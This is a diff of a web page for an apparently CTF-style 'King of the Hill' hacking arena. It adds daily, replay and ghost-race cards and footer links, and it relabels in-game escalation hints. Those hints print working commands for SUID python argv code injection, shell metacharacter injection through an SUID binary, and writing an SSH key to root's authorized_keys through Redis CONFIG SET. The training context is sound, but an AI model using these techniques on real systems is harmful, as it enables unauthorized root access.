@@ -11,6 +11,7 @@ import { topNForRound } from "@/lib/koth/scoring";
 import { currentPricesForRound } from "@/lib/koth/paths";
 import { getLifetimeStatsForUsers } from "@/lib/koth/honors";
 import { titleFromRoundWins } from "@/lib/koth/titles";
+import { secondsUntilNextSeed, todayUtcString } from "@/lib/koth/daily";
 import { joinKothRound, submitKothKey } from "./actions";
 import { RealtimeRefresh } from "./RealtimeRefresh";
 
@@ -21,6 +22,20 @@ const ROUND_DURATION_SECONDS = 30 * 60;
 const ARENA_HOST = "204.168.229.209";
 const ARENA_PORT = 2300;
 const ESCALATION_THRESHOLD_SECONDS = 300;
+
+// Daily challenge — days since project epoch. Mirrors /battles/koth/daily.
+const DAILY_EPOCH = new Date("2026-05-01T00:00:00Z").getTime();
+function dailyChallengeNumber(day: string): number {
+  const d = new Date(day + "T00:00:00Z").getTime();
+  return Math.max(1, Math.floor((d - DAILY_EPOCH) / 86400_000) + 1);
+}
+
+function fmtHHMMSS(sec: number): string {
+  const h = Math.floor(sec / 3600);
+  const m = Math.floor((sec % 3600) / 60);
+  const s = sec % 60;
+  return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
+}
 
 type EventMeta = { value_snapshot?: number };
 function snapOf(raw: unknown): number | null {
@@ -206,6 +221,10 @@ export default async function KothPage({
     (p) => p.kind === "escalation" && !p.activated && p.pendingUntil !== null,
   );
 
+  const todayDay = todayUtcString();
+  const todayChallenge = dailyChallengeNumber(todayDay);
+  const secsToNextDaily = secondsUntilNextSeed();
+
   return (
     <article className="space-y-5 max-w-3xl" data-testid="koth-page">
       <RealtimeRefresh intervalMs={3000} />
@@ -236,6 +255,66 @@ export default async function KothPage({
           Read the Rules →
         </Link>
       </div>
+
+      {/* Solo modes — hero-level CTAs for Daily + Replays + Race.
+          Above the round console so they read as first-class entries,
+          not buried in the footer. Three equal cards, each fully
+          clickable. */}
+      <section className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+        <Link
+          href="/battles/koth/daily"
+          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
+        >
+          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
+            ▸ daily · solo
+          </div>
+          <div className="text-text text-[15px] mt-1.5 tracking-wide">
+            #{todayChallenge} · one primitive
+          </div>
+          <div className="text-muted text-[11px] mt-1 tabular-nums">
+            resets in {fmtHHMMSS(secsToNextDaily)}
+          </div>
+          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
+            crown today →
+          </div>
+        </Link>
+
+        <Link
+          href="/battles/koth/replays"
+          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
+        >
+          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
+            ▸ replays · library
+          </div>
+          <div className="text-text text-[15px] mt-1.5 tracking-wide">
+            every crown · auto-clipped
+          </div>
+          <div className="text-muted text-[11px] mt-1">
+            asciinema · raw .cast · deep links
+          </div>
+          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
+            watch the kills →
+          </div>
+        </Link>
+
+        <Link
+          href="/battles/koth/replays?kind=crown_moment"
+          className="group block border border-amber/30 bg-amber/[0.03] hover:bg-amber/[0.08] hover:border-amber/60 transition-colors px-3 py-3 font-mono"
+        >
+          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase">
+            ▸ ghost · race
+          </div>
+          <div className="text-text text-[15px] mt-1.5 tracking-wide">
+            beat a recorded crown
+          </div>
+          <div className="text-muted text-[11px] mt-1">
+            solo · per-replay leaderboard
+          </div>
+          <div className="text-amber/70 group-hover:text-amber text-[11px] mt-2 tracking-[0.18em] uppercase">
+            pick a ghost →
+          </div>
+        </Link>
+      </section>
 
       {/* ─── Combined Arena Console ───────────────────────────────
           Round status strip (top) + enlist / SSH / sign-in (body).
@@ -380,25 +459,25 @@ export default async function KothPage({
               <div className="space-y-3 pt-2 pb-1">
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L7 — phantom-python3 SUID · argv code injection
+                    suid-python-wrapper · argv code injection
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/phantom-python3 -c \\
-  'import os; os.system("crown-claim koth${mySlot.slot} l7-suid")'`}
+  'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
                   </pre>
                 </div>
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L8 — system-checker SUID · shell metachar injection
+                    suid-shell-injection · shell metachar through SUID wrapper
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/system-checker \\
-  '127.0.0.1; crown-claim koth${mySlot.slot} l8-suid'`}
+  '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'`}
                   </pre>
                 </div>
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
+                    redis-config-set-dir · write authorized_keys via redis-cli
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
 {`ssh-keygen -t ed25519 -f /tmp/k -N ''
@@ -410,7 +489,7 @@ SET x "\\n\\n$KEY\\n\\n"
 SAVE
 EOF
 ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
-  "crown-claim koth${mySlot.slot} l17-redis"`}
+  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
                   </pre>
                 </div>
                 <p className="text-[10px] text-muted leading-snug pt-1">
@@ -574,6 +653,12 @@ ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
           ← battles
         </Link>
         <div className="flex items-center gap-3">
+          <Link href="/battles/koth/daily" className="hover:text-amber tracking-[0.18em] uppercase">
+            daily
+          </Link>
+          <Link href="/battles/koth/replays" className="hover:text-amber tracking-[0.18em] uppercase">
+            replays
+          </Link>
           <Link href="/battles/koth/champions" className="hover:text-amber tracking-[0.18em] uppercase">
             champions
           </Link>
